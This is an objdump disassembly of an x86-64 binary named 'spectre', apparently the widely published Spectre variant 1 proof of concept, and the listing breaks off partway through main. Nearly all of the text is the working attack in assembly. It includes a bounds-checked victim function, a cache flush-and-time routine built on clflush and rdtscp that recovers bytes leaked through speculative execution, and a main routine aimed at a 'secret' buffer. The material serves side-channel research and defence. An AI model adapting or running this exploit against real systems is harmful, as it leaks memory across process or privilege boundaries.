
spectre:     file format elf64-x86-64


Disassembly of section .init:

00000000000005f8 <_init>:
 5f8:	48 83 ec 08          	sub    $0x8,%rsp
 5fc:	48 8b 05 e5 19 20 00 	mov    0x2019e5(%rip),%rax        # 201fe8 <__gmon_start__>
 603:	48 85 c0             	test   %rax,%rax
 606:	74 02                	je     60a <_init+0x12>
 608:	ff d0                	callq  *%rax
 60a:	48 83 c4 08          	add    $0x8,%rsp
 60e:	c3                   	retq   

Disassembly of section .plt:

0000000000000610 <.plt>:
 610:	ff 35 92 19 20 00    	pushq  0x201992(%rip)        # 201fa8 <_GLOBAL_OFFSET_TABLE_+0x8>
 616:	ff 25 94 19 20 00    	jmpq   *0x201994(%rip)        # 201fb0 <_GLOBAL_OFFSET_TABLE_+0x10>
 61c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000000620 <putchar@plt>:
 620:	ff 25 92 19 20 00    	jmpq   *0x201992(%rip)        # 201fb8 <putchar@GLIBC_2.2.5>
 626:	68 00 00 00 00       	pushq  $0x0
 62b:	e9 e0 ff ff ff       	jmpq   610 <.plt>

0000000000000630 <__stack_chk_fail@plt>:
 630:	ff 25 8a 19 20 00    	jmpq   *0x20198a(%rip)        # 201fc0 <__stack_chk_fail@GLIBC_2.4>
 636:	68 01 00 00 00       	pushq  $0x1
 63b:	e9 d0 ff ff ff       	jmpq   610 <.plt>

0000000000000640 <printf@plt>:
 640:	ff 25 82 19 20 00    	jmpq   *0x201982(%rip)        # 201fc8 <printf@GLIBC_2.2.5>
 646:	68 02 00 00 00       	pushq  $0x2
 64b:	e9 c0 ff ff ff       	jmpq   610 <.plt>

0000000000000650 <__isoc99_sscanf@plt>:
 650:	ff 25 7a 19 20 00    	jmpq   *0x20197a(%rip)        # 201fd0 <__isoc99_sscanf@GLIBC_2.7>
 656:	68 03 00 00 00       	pushq  $0x3
 65b:	e9 b0 ff ff ff       	jmpq   610 <.plt>

Disassembly of section .plt.got:

0000000000000660 <__cxa_finalize@plt>:
 660:	ff 25 92 19 20 00    	jmpq   *0x201992(%rip)        # 201ff8 <__cxa_finalize@GLIBC_2.2.5>
 666:	66 90                	xchg   %ax,%ax

Disassembly of section .text:

0000000000000670 <_start>:
 670:	31 ed                	xor    %ebp,%ebp
 672:	49 89 d1             	mov    %rdx,%r9
 675:	5e                   	pop    %rsi
 676:	48 89 e2             	mov    %rsp,%rdx
 679:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
 67d:	50                   	push   %rax
 67e:	54                   	push   %rsp
 67f:	4c 8d 05 4a 07 00 00 	lea    0x74a(%rip),%r8        # dd0 <__libc_csu_fini>
 686:	48 8d 0d d3 06 00 00 	lea    0x6d3(%rip),%rcx        # d60 <__libc_csu_init>
 68d:	48 8d 3d df 04 00 00 	lea    0x4df(%rip),%rdi        # b73 <main>
 694:	ff 15 46 19 20 00    	callq  *0x201946(%rip)        # 201fe0 <__libc_start_main@GLIBC_2.2.5>
 69a:	f4                   	hlt    
 69b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

00000000000006a0 <deregister_tm_clones>:
 6a0:	48 8d 3d 41 1a 20 00 	lea    0x201a41(%rip),%rdi        # 2020e8 <__TMC_END__>
 6a7:	55                   	push   %rbp
 6a8:	48 8d 05 39 1a 20 00 	lea    0x201a39(%rip),%rax        # 2020e8 <__TMC_END__>
 6af:	48 39 f8             	cmp    %rdi,%rax
 6b2:	48 89 e5             	mov    %rsp,%rbp
 6b5:	74 19                	je     6d0 <deregister_tm_clones+0x30>
 6b7:	48 8b 05 1a 19 20 00 	mov    0x20191a(%rip),%rax        # 201fd8 <_ITM_deregisterTMCloneTable>
 6be:	48 85 c0             	test   %rax,%rax
 6c1:	74 0d                	je     6d0 <deregister_tm_clones+0x30>
 6c3:	5d                   	pop    %rbp
 6c4:	ff e0                	jmpq   *%rax
 6c6:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 6cd:	00 00 00 
 6d0:	5d                   	pop    %rbp
 6d1:	c3                   	retq   
 6d2:	0f 1f 40 00          	nopl   0x0(%rax)
 6d6:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 6dd:	00 00 00 

00000000000006e0 <register_tm_clones>:
 6e0:	48 8d 3d 01 1a 20 00 	lea    0x201a01(%rip),%rdi        # 2020e8 <__TMC_END__>
 6e7:	48 8d 35 fa 19 20 00 	lea    0x2019fa(%rip),%rsi        # 2020e8 <__TMC_END__>
 6ee:	55                   	push   %rbp
 6ef:	48 29 fe             	sub    %rdi,%rsi
 6f2:	48 89 e5             	mov    %rsp,%rbp
 6f5:	48 c1 fe 03          	sar    $0x3,%rsi
 6f9:	48 89 f0             	mov    %rsi,%rax
 6fc:	48 c1 e8 3f          	shr    $0x3f,%rax
 700:	48 01 c6             	add    %rax,%rsi
 703:	48 d1 fe             	sar    %rsi
 706:	74 18                	je     720 <register_tm_clones+0x40>
 708:	48 8b 05 e1 18 20 00 	mov    0x2018e1(%rip),%rax        # 201ff0 <_ITM_registerTMCloneTable>
 70f:	48 85 c0             	test   %rax,%rax
 712:	74 0c                	je     720 <register_tm_clones+0x40>
 714:	5d                   	pop    %rbp
 715:	ff e0                	jmpq   *%rax
 717:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
 71e:	00 00 
 720:	5d                   	pop    %rbp
 721:	c3                   	retq   
 722:	0f 1f 40 00          	nopl   0x0(%rax)
 726:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 72d:	00 00 00 

0000000000000730 <__do_global_dtors_aux>:
 730:	80 3d c9 19 20 00 00 	cmpb   $0x0,0x2019c9(%rip)        # 202100 <completed.7697>
 737:	75 2f                	jne    768 <__do_global_dtors_aux+0x38>
 739:	48 83 3d b7 18 20 00 	cmpq   $0x0,0x2018b7(%rip)        # 201ff8 <__cxa_finalize@GLIBC_2.2.5>
 740:	00 
 741:	55                   	push   %rbp
 742:	48 89 e5             	mov    %rsp,%rbp
 745:	74 0c                	je     753 <__do_global_dtors_aux+0x23>
 747:	48 8b 3d ba 18 20 00 	mov    0x2018ba(%rip),%rdi        # 202008 <__dso_handle>
 74e:	e8 0d ff ff ff       	callq  660 <__cxa_finalize@plt>
 753:	e8 48 ff ff ff       	callq  6a0 <deregister_tm_clones>
 758:	c6 05 a1 19 20 00 01 	movb   $0x1,0x2019a1(%rip)        # 202100 <completed.7697>
 75f:	5d                   	pop    %rbp
 760:	c3                   	retq   
 761:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
 768:	f3 c3                	repz retq 
 76a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000000000770 <frame_dummy>:
 770:	55                   	push   %rbp
 771:	48 89 e5             	mov    %rsp,%rbp
 774:	5d                   	pop    %rbp
 775:	e9 66 ff ff ff       	jmpq   6e0 <register_tm_clones>

000000000000077a <victim_function>:
 77a:	55                   	push   %rbp
 77b:	48 89 e5             	mov    %rsp,%rbp
 77e:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
 782:	8b 05 98 18 20 00    	mov    0x201898(%rip),%eax        # 202020 <array1_size>
 788:	89 c0                	mov    %eax,%eax
 78a:	48 39 45 f8          	cmp    %rax,-0x8(%rbp)
 78e:	73 0d                	jae    79d <victim_function+0x23>
 790:	0f b6 05 89 19 20 00 	movzbl 0x201989(%rip),%eax        # 202120 <temp>
 797:	88 05 83 19 20 00    	mov    %al,0x201983(%rip)        # 202120 <temp>
 79d:	48 8d 15 9c 18 20 00 	lea    0x20189c(%rip),%rdx        # 202040 <array1>
 7a4:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 7a8:	48 01 d0             	add    %rdx,%rax
 7ab:	0f b6 00             	movzbl (%rax),%eax
 7ae:	0f b6 c0             	movzbl %al,%eax
 7b1:	c1 e0 0c             	shl    $0xc,%eax
 7b4:	48 63 d0             	movslq %eax,%rdx
 7b7:	48 8d 05 c2 1d 20 00 	lea    0x201dc2(%rip),%rax        # 202580 <array2>
 7be:	0f b6 14 02          	movzbl (%rdx,%rax,1),%edx
 7c2:	0f b6 05 57 19 20 00 	movzbl 0x201957(%rip),%eax        # 202120 <temp>
 7c9:	21 d0                	and    %edx,%eax
 7cb:	88 05 4f 19 20 00    	mov    %al,0x20194f(%rip)        # 202120 <temp>
 7d1:	90                   	nop
 7d2:	5d                   	pop    %rbp
 7d3:	c3                   	retq   

00000000000007d4 <readMemoryByte>:
 7d4:	55                   	push   %rbp
 7d5:	48 89 e5             	mov    %rsp,%rbp
 7d8:	53                   	push   %rbx
 7d9:	48 83 ec 58          	sub    $0x58,%rsp
 7dd:	48 89 7d b0          	mov    %rdi,-0x50(%rbp)
 7e1:	48 89 75 a8          	mov    %rsi,-0x58(%rbp)
 7e5:	48 89 55 a0          	mov    %rdx,-0x60(%rbp)
 7e9:	c7 45 d8 00 00 00 00 	movl   $0x0,-0x28(%rbp)
 7f0:	c7 45 c8 00 00 00 00 	movl   $0x0,-0x38(%rbp)
 7f7:	eb 1f                	jmp    818 <readMemoryByte+0x44>
 7f9:	8b 45 c8             	mov    -0x38(%rbp),%eax
 7fc:	48 98                	cltq   
 7fe:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 805:	00 
 806:	48 8d 05 33 19 20 00 	lea    0x201933(%rip),%rax        # 202140 <results.23457>
 80d:	c7 04 02 00 00 00 00 	movl   $0x0,(%rdx,%rax,1)
 814:	83 45 c8 01          	addl   $0x1,-0x38(%rbp)
 818:	81 7d c8 ff 00 00 00 	cmpl   $0xff,-0x38(%rbp)
 81f:	7e d8                	jle    7f9 <readMemoryByte+0x25>
 821:	c7 45 c4 00 00 00 00 	movl   $0x0,-0x3c(%rbp)
 828:	e9 cc 02 00 00       	jmpq   af9 <readMemoryByte+0x325>
 82d:	c7 45 c8 00 00 00 00 	movl   $0x0,-0x38(%rbp)
 834:	eb 1a                	jmp    850 <readMemoryByte+0x7c>
 836:	8b 45 c8             	mov    -0x38(%rbp),%eax
 839:	c1 e0 0c             	shl    $0xc,%eax
 83c:	48 63 d0             	movslq %eax,%rdx
 83f:	48 8d 05 3a 1d 20 00 	lea    0x201d3a(%rip),%rax        # 202580 <array2>
 846:	48 01 d0             	add    %rdx,%rax
 849:	0f ae 38             	clflush (%rax)
 84c:	83 45 c8 01          	addl   $0x1,-0x38(%rbp)
 850:	81 7d c8 ff 00 00 00 	cmpl   $0xff,-0x38(%rbp)
 857:	7e dd                	jle    836 <readMemoryByte+0x62>
 859:	8b 45 c4             	mov    -0x3c(%rbp),%eax
 85c:	8b 0d be 17 20 00    	mov    0x2017be(%rip),%ecx        # 202020 <array1_size>
 862:	ba 00 00 00 00       	mov    $0x0,%edx
 867:	f7 f1                	div    %ecx
 869:	89 d0                	mov    %edx,%eax
 86b:	89 c0                	mov    %eax,%eax
 86d:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
 871:	c7 45 cc 1d 00 00 00 	movl   $0x1d,-0x34(%rbp)
 878:	e9 95 00 00 00       	jmpq   912 <readMemoryByte+0x13e>
 87d:	48 8d 05 9c 17 20 00 	lea    0x20179c(%rip),%rax        # 202020 <array1_size>
 884:	0f ae 38             	clflush (%rax)
 887:	c7 45 d4 00 00 00 00 	movl   $0x0,-0x2c(%rbp)
 88e:	eb 1a                	jmp    8aa <readMemoryByte+0xd6>
 890:	8b 45 d4             	mov    -0x2c(%rbp),%eax
 893:	c1 e0 0c             	shl    $0xc,%eax
 896:	48 63 d0             	movslq %eax,%rdx
 899:	48 8d 05 e0 1c 20 00 	lea    0x201ce0(%rip),%rax        # 202580 <array2>
 8a0:	48 01 d0             	add    %rdx,%rax
 8a3:	0f ae 38             	clflush (%rax)
 8a6:	83 45 d4 01          	addl   $0x1,-0x2c(%rbp)
 8aa:	81 7d d4 ff 00 00 00 	cmpl   $0xff,-0x2c(%rbp)
 8b1:	7e dd                	jle    890 <readMemoryByte+0xbc>
 8b3:	0f ae f0             	mfence 
 8b6:	8b 4d cc             	mov    -0x34(%rbp),%ecx
 8b9:	ba ab aa aa 2a       	mov    $0x2aaaaaab,%edx
 8be:	89 c8                	mov    %ecx,%eax
 8c0:	f7 ea                	imul   %edx
 8c2:	89 c8                	mov    %ecx,%eax
 8c4:	c1 f8 1f             	sar    $0x1f,%eax
 8c7:	29 c2                	sub    %eax,%edx
 8c9:	89 d0                	mov    %edx,%eax
 8cb:	01 c0                	add    %eax,%eax
 8cd:	01 d0                	add    %edx,%eax
 8cf:	01 c0                	add    %eax,%eax
 8d1:	29 c1                	sub    %eax,%ecx
 8d3:	89 ca                	mov    %ecx,%edx
 8d5:	8d 42 ff             	lea    -0x1(%rdx),%eax
 8d8:	66 b8 00 00          	mov    $0x0,%ax
 8dc:	48 98                	cltq   
 8de:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
 8e2:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 8e6:	48 c1 e8 10          	shr    $0x10,%rax
 8ea:	48 09 45 f0          	or     %rax,-0x10(%rbp)
 8ee:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
 8f2:	48 33 45 e0          	xor    -0x20(%rbp),%rax
 8f6:	48 23 45 f0          	and    -0x10(%rbp),%rax
 8fa:	48 33 45 e0          	xor    -0x20(%rbp),%rax
 8fe:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
 902:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 906:	48 89 c7             	mov    %rax,%rdi
 909:	e8 6c fe ff ff       	callq  77a <victim_function>
 90e:	83 6d cc 01          	subl   $0x1,-0x34(%rbp)
 912:	83 7d cc 00          	cmpl   $0x0,-0x34(%rbp)
 916:	0f 89 61 ff ff ff    	jns    87d <readMemoryByte+0xa9>
 91c:	c7 45 c0 00 00 00 00 	movl   $0x0,-0x40(%rbp)
 923:	eb 09                	jmp    92e <readMemoryByte+0x15a>
 925:	8b 45 c0             	mov    -0x40(%rbp),%eax
 928:	83 c0 01             	add    $0x1,%eax
 92b:	89 45 c0             	mov    %eax,-0x40(%rbp)
 92e:	8b 45 c0             	mov    -0x40(%rbp),%eax
 931:	83 f8 63             	cmp    $0x63,%eax
 934:	7e ef                	jle    925 <readMemoryByte+0x151>
 936:	c7 45 c8 00 00 00 00 	movl   $0x0,-0x38(%rbp)
 93d:	e9 8a 00 00 00       	jmpq   9cc <readMemoryByte+0x1f8>
 942:	8b 45 c8             	mov    -0x38(%rbp),%eax
 945:	69 c0 a7 00 00 00    	imul   $0xa7,%eax,%eax
 94b:	83 c0 0d             	add    $0xd,%eax
 94e:	25 ff 00 00 00       	and    $0xff,%eax
 953:	89 45 dc             	mov    %eax,-0x24(%rbp)
 956:	48 c7 45 e8 00 00 00 	movq   $0x0,-0x18(%rbp)
 95d:	00 
 95e:	8b 45 dc             	mov    -0x24(%rbp),%eax
 961:	c1 e0 0c             	shl    $0xc,%eax
 964:	48 63 d0             	movslq %eax,%rdx
 967:	48 8d 05 12 1c 20 00 	lea    0x201c12(%rip),%rax        # 202580 <array2>
 96e:	48 01 d0             	add    %rdx,%rax
 971:	48 89 c3             	mov    %rax,%rbx
 974:	0f ae f0             	mfence 
 977:	0f ae e8             	lfence 
 97a:	0f 01 f9             	rdtscp 
 97d:	49 89 c2             	mov    %rax,%r10
 980:	48 8b 0b             	mov    (%rbx),%rcx
 983:	0f 01 f9             	rdtscp 
 986:	4c 29 d0             	sub    %r10,%rax
 989:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
 98d:	48 81 7d e8 40 01 00 	cmpq   $0x140,-0x18(%rbp)
 994:	00 
 995:	77 31                	ja     9c8 <readMemoryByte+0x1f4>
 997:	8b 45 dc             	mov    -0x24(%rbp),%eax
 99a:	48 98                	cltq   
 99c:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 9a3:	00 
 9a4:	48 8d 05 95 17 20 00 	lea    0x201795(%rip),%rax        # 202140 <results.23457>
 9ab:	8b 04 02             	mov    (%rdx,%rax,1),%eax
 9ae:	8d 48 01             	lea    0x1(%rax),%ecx
 9b1:	8b 45 dc             	mov    -0x24(%rbp),%eax
 9b4:	48 98                	cltq   
 9b6:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 9bd:	00 
 9be:	48 8d 05 7b 17 20 00 	lea    0x20177b(%rip),%rax        # 202140 <results.23457>
 9c5:	89 0c 02             	mov    %ecx,(%rdx,%rax,1)
 9c8:	83 45 c8 01          	addl   $0x1,-0x38(%rbp)
 9cc:	81 7d c8 ff 00 00 00 	cmpl   $0xff,-0x38(%rbp)
 9d3:	0f 8e 69 ff ff ff    	jle    942 <readMemoryByte+0x16e>
 9d9:	c7 45 d0 ff ff ff ff 	movl   $0xffffffff,-0x30(%rbp)
 9e0:	8b 45 d0             	mov    -0x30(%rbp),%eax
 9e3:	89 45 cc             	mov    %eax,-0x34(%rbp)
 9e6:	c7 45 c8 00 00 00 00 	movl   $0x0,-0x38(%rbp)
 9ed:	e9 88 00 00 00       	jmpq   a7a <readMemoryByte+0x2a6>
 9f2:	83 7d cc 00          	cmpl   $0x0,-0x34(%rbp)
 9f6:	78 32                	js     a2a <readMemoryByte+0x256>
 9f8:	8b 45 c8             	mov    -0x38(%rbp),%eax
 9fb:	48 98                	cltq   
 9fd:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 a04:	00 
 a05:	48 8d 05 34 17 20 00 	lea    0x201734(%rip),%rax        # 202140 <results.23457>
 a0c:	8b 14 02             	mov    (%rdx,%rax,1),%edx
 a0f:	8b 45 cc             	mov    -0x34(%rbp),%eax
 a12:	48 98                	cltq   
 a14:	48 8d 0c 85 00 00 00 	lea    0x0(,%rax,4),%rcx
 a1b:	00 
 a1c:	48 8d 05 1d 17 20 00 	lea    0x20171d(%rip),%rax        # 202140 <results.23457>
 a23:	8b 04 01             	mov    (%rcx,%rax,1),%eax
 a26:	39 c2                	cmp    %eax,%edx
 a28:	7c 0e                	jl     a38 <readMemoryByte+0x264>
 a2a:	8b 45 cc             	mov    -0x34(%rbp),%eax
 a2d:	89 45 d0             	mov    %eax,-0x30(%rbp)
 a30:	8b 45 c8             	mov    -0x38(%rbp),%eax
 a33:	89 45 cc             	mov    %eax,-0x34(%rbp)
 a36:	eb 3e                	jmp    a76 <readMemoryByte+0x2a2>
 a38:	83 7d d0 00          	cmpl   $0x0,-0x30(%rbp)
 a3c:	78 32                	js     a70 <readMemoryByte+0x29c>
 a3e:	8b 45 c8             	mov    -0x38(%rbp),%eax
 a41:	48 98                	cltq   
 a43:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 a4a:	00 
 a4b:	48 8d 05 ee 16 20 00 	lea    0x2016ee(%rip),%rax        # 202140 <results.23457>
 a52:	8b 14 02             	mov    (%rdx,%rax,1),%edx
 a55:	8b 45 d0             	mov    -0x30(%rbp),%eax
 a58:	48 98                	cltq   
 a5a:	48 8d 0c 85 00 00 00 	lea    0x0(,%rax,4),%rcx
 a61:	00 
 a62:	48 8d 05 d7 16 20 00 	lea    0x2016d7(%rip),%rax        # 202140 <results.23457>
 a69:	8b 04 01             	mov    (%rcx,%rax,1),%eax
 a6c:	39 c2                	cmp    %eax,%edx
 a6e:	7c 06                	jl     a76 <readMemoryByte+0x2a2>
 a70:	8b 45 c8             	mov    -0x38(%rbp),%eax
 a73:	89 45 d0             	mov    %eax,-0x30(%rbp)
 a76:	83 45 c8 01          	addl   $0x1,-0x38(%rbp)
 a7a:	81 7d c8 ff 00 00 00 	cmpl   $0xff,-0x38(%rbp)
 a81:	0f 8e 6b ff ff ff    	jle    9f2 <readMemoryByte+0x21e>
 a87:	8b 45 cc             	mov    -0x34(%rbp),%eax
 a8a:	48 98                	cltq   
 a8c:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 a93:	00 
 a94:	48 8d 05 a5 16 20 00 	lea    0x2016a5(%rip),%rax        # 202140 <results.23457>
 a9b:	8b 14 02             	mov    (%rdx,%rax,1),%edx
 a9e:	8b 45 d0             	mov    -0x30(%rbp),%eax
 aa1:	48 98                	cltq   
 aa3:	48 8d 0c 85 00 00 00 	lea    0x0(,%rax,4),%rcx
 aaa:	00 
 aab:	48 8d 05 8e 16 20 00 	lea    0x20168e(%rip),%rax        # 202140 <results.23457>
 ab2:	8b 04 01             	mov    (%rcx,%rax,1),%eax
 ab5:	01 c0                	add    %eax,%eax
 ab7:	83 c0 05             	add    $0x5,%eax
 aba:	39 c2                	cmp    %eax,%edx
 abc:	7d 48                	jge    b06 <readMemoryByte+0x332>
 abe:	8b 45 cc             	mov    -0x34(%rbp),%eax
 ac1:	48 98                	cltq   
 ac3:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 aca:	00 
 acb:	48 8d 05 6e 16 20 00 	lea    0x20166e(%rip),%rax        # 202140 <results.23457>
 ad2:	8b 04 02             	mov    (%rdx,%rax,1),%eax
 ad5:	83 f8 02             	cmp    $0x2,%eax
 ad8:	75 1b                	jne    af5 <readMemoryByte+0x321>
 ada:	8b 45 d0             	mov    -0x30(%rbp),%eax
 add:	48 98                	cltq   
 adf:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 ae6:	00 
 ae7:	48 8d 05 52 16 20 00 	lea    0x201652(%rip),%rax        # 202140 <results.23457>
 aee:	8b 04 02             	mov    (%rdx,%rax,1),%eax
 af1:	85 c0                	test   %eax,%eax
 af3:	74 11                	je     b06 <readMemoryByte+0x332>
 af5:	83 45 c4 01          	addl   $0x1,-0x3c(%rbp)
 af9:	81 7d c4 e6 03 00 00 	cmpl   $0x3e6,-0x3c(%rbp)
 b00:	0f 8e 27 fd ff ff    	jle    82d <readMemoryByte+0x59>
 b06:	8b 05 34 16 20 00    	mov    0x201634(%rip),%eax        # 202140 <results.23457>
 b0c:	33 45 d8             	xor    -0x28(%rbp),%eax
 b0f:	89 05 2b 16 20 00    	mov    %eax,0x20162b(%rip)        # 202140 <results.23457>
 b15:	8b 45 cc             	mov    -0x34(%rbp),%eax
 b18:	89 c2                	mov    %eax,%edx
 b1a:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
 b1e:	88 10                	mov    %dl,(%rax)
 b20:	8b 45 cc             	mov    -0x34(%rbp),%eax
 b23:	48 98                	cltq   
 b25:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 b2c:	00 
 b2d:	48 8d 05 0c 16 20 00 	lea    0x20160c(%rip),%rax        # 202140 <results.23457>
 b34:	8b 14 02             	mov    (%rdx,%rax,1),%edx
 b37:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
 b3b:	89 10                	mov    %edx,(%rax)
 b3d:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
 b41:	48 83 c0 01          	add    $0x1,%rax
 b45:	8b 55 d0             	mov    -0x30(%rbp),%edx
 b48:	88 10                	mov    %dl,(%rax)
 b4a:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
 b4e:	48 8d 50 04          	lea    0x4(%rax),%rdx
 b52:	8b 45 d0             	mov    -0x30(%rbp),%eax
 b55:	48 98                	cltq   
 b57:	48 8d 0c 85 00 00 00 	lea    0x0(,%rax,4),%rcx
 b5e:	00 
 b5f:	48 8d 05 da 15 20 00 	lea    0x2015da(%rip),%rax        # 202140 <results.23457>
 b66:	8b 04 01             	mov    (%rcx,%rax,1),%eax
 b69:	89 02                	mov    %eax,(%rdx)
 b6b:	90                   	nop
 b6c:	48 83 c4 58          	add    $0x58,%rsp
 b70:	5b                   	pop    %rbx
 b71:	5d                   	pop    %rbp
 b72:	c3                   	retq   

0000000000000b73 <main>:
 b73:	55                   	push   %rbp
 b74:	48 89 e5             	mov    %rsp,%rbp
 b77:	48 83 ec 40          	sub    $0x40,%rsp
 b7b:	89 7d cc             	mov    %edi,-0x34(%rbp)
 b7e:	48 89 75 c0          	mov    %rsi,-0x40(%rbp)
 b82:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
 b89:	00 00 
 b8b:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
 b8f:	31 c0                	xor    %eax,%eax
 b91:	48 8b 05 48 15 20 00 	mov    0x201548(%rip),%rax        # 2020e0 <secret>
 b98:	48 89 c2             	mov    %rax,%rdx
 b9b:	48 8d 05 9e 14 20 00 	lea    0x20149e(%rip),%rax        # 202040 <array1>
 ba2:	48 29 c2             	sub    %rax,%rdx
 ba5:	48 89 d0             	mov    %rdx,%rax
 ba8:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
 bac:	c7 45 d8 28 00 00 00 	movl   $0x28,-0x28(%rbp)
 bb3:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%rbp)
 bba:	eb 15                	jmp    bd1 <main+0x5e>
 bbc:	8b 45 dc             	mov    -0x24(%rbp),%eax
 bbf:	48 63 d0             	movslq %eax,%rdx
 bc2:	48 8d 05 b7 19 20 00 	lea    0x2019b7(%rip),%rax        # 202580 <array2>
 bc9:	c6 04 02 01          	movb   $0x1,(%rdx,%rax,1)
 bcd:	83 45 dc 01          	addl   $0x1,-0x24(%rbp)
 bd1:	8b 45 dc             	mov    -0x24(%rbp),%eax
 bd4:	3d ff ff 0f 00       	cmp    $0xfffff,%eax
 bd9:	76 e1                	jbe    bbc <main+0x49>
 bdb:	83 7d cc 03          	cmpl   $0x3,-0x34(%rbp)
 bdf:	75 5b                	jne    c3c <main+0xc9>
 be1:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
 be5:	48 83 c0 08          	add    $0x8,%rax
 be9:	48 8b 00             	mov    (%rax),%rax
 bec:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
 bf0:	48 8d 35 1a 02 00 00 	lea    0x21a(%rip),%rsi        # e11 <_IO_stdin_used+0x31>
 bf7:	48 89 c7             	mov    %rax,%rdi
 bfa:	b8 00 00 00 00       	mov    $0x0,%eax
 bff:	e8 4c fa ff ff       	callq  650 <__isoc99_sscanf@plt>
 c04:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
 c08:	48 8d 05 31 14 20 00 	lea    0x201431(%rip),%rax        # 202040 <array1>
 c0f:	48 29 c2             	sub    %rax,%rdx
 c12:	48 89 d0             	mov    %rdx,%rax
 c15:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
 c19:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
 c1d:	48 83 c0 10          	add    $0x10,%rax
 c21:	48 8b 00             	mov    (%rax),%rax
 c24:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
 c28:	48 8d 35 e5 01 00 00 	lea    0x1e5(%rip),%rsi        # e14 <_IO_stdin_used+0x34>
 c2f:	48 89 c7             	mov    %rax,%rdi
 c32:	b8 00 00 00 00       	mov    $0x0,%eax
 c37:	e8 14 fa ff ff       	callq  650 <__isoc99_sscanf@plt>
 c3c:	8b 45 d8             	mov    -0x28(%rbp),%eax
 c3f:	89 c6                	mov    %eax,%esi
 c41:	48 8d 3d cf 01 00 00 	lea    0x1cf(%rip),%rdi        # e17 <_IO_stdin_used+0x37>
 c48:	b8 00 00 00 00       	mov    $0x0,%eax
 c4d:	e8 ee f9 ff ff       	callq  640 <printf@plt>
 c52:	e9 d2 00 00 00       	jmpq   d29 <main+0x1b6>
 c57:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
 c5b:	48 89 c6             	mov    %rax,%rsi
 c5e:	48 8d 3d cb 01 00 00 	lea    0x1cb(%rip),%rdi        # e30 <_IO_stdin_used+0x50>
 c65:	b8 00 00 00 00       	mov    $0x0,%eax
 c6a:	e8 d1 f9 ff ff       	callq  640 <printf@plt>
 c6f:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
 c73:	48 8d 50 01          	lea    0x1(%rax),%rdx
 c77:	48 89 55 e0          	mov    %rdx,-0x20(%rbp)
 c7b:	48 8d 55 ec          	lea    -0x14(%rbp),%rdx
 c7f:	48 8d 4d f6          	lea    -0xa(%rbp),%rcx
 c83:	48 89 ce             	mov    %rcx,%rsi
 c86:	48 89 c7             	mov    %rax,%rdi
 c89:	e8 46 fb ff ff       	callq  7d4 <readMemoryByte>
 c8e:	8b 45 ec             	mov    -0x14(%rbp),%eax
 c91:	8b 55 f0             	mov    -0x10(%rbp),%edx
 c94:	01 d2                	add    %edx,%edx
 c96:	39 d0                	cmp    %edx,%eax
 c98:	7c 09                	jl     ca3 <main+0x130>
 c9a:	48 8d 05 af 01 00 00 	lea    0x1af(%rip),%rax        # e50 <_IO_stdin_used+0x70>
 ca1:	eb 07                	jmp    caa <main+0x137>
 ca3:	48 8d 05 ae 01 00 00 	lea    0x1ae(%rip),%rax        # e58 <_IO_stdin_used+0x78>
 caa:	48 89 c6             	mov    %rax,%rsi
 cad:	48 8d 3d ac 01 00 00 	lea    0x1ac(%rip),%rdi        # e60 <_IO_stdin_used+0x80>
 cb4:	b8 00 00 00 00       	mov    $0x0,%eax
 cb9:	e8 82 f9 ff ff       	callq  640 <printf@plt>
 cbe:	8b 55 ec             	mov    -0x14(%rbp),%edx
 cc1:	0f b6 45 f6          	movzbl -0xa(%rbp),%eax
 cc5:	3c 1f                	cmp    $0x1f,%al
 cc7:	76 11                	jbe    cda <main+0x167>
 cc9:	0f b6 45 f6          	movzbl -0xa(%rbp),%eax
 ccd:	3c 7e                	cmp    $0x7e,%al
 ccf:	77 09                	ja     cda <main+0x167>
 cd1:	0f b6 45 f6          	movzbl -0xa(%rbp),%eax
 cd5:	0f b6 c0             	movzbl %al,%eax
 cd8:	eb 05                	jmp    cdf <main+0x16c>
 cda:	b8 3f 00 00 00       	mov    $0x3f,%eax
 cdf:	0f b6 4d f6          	movzbl -0xa(%rbp),%ecx
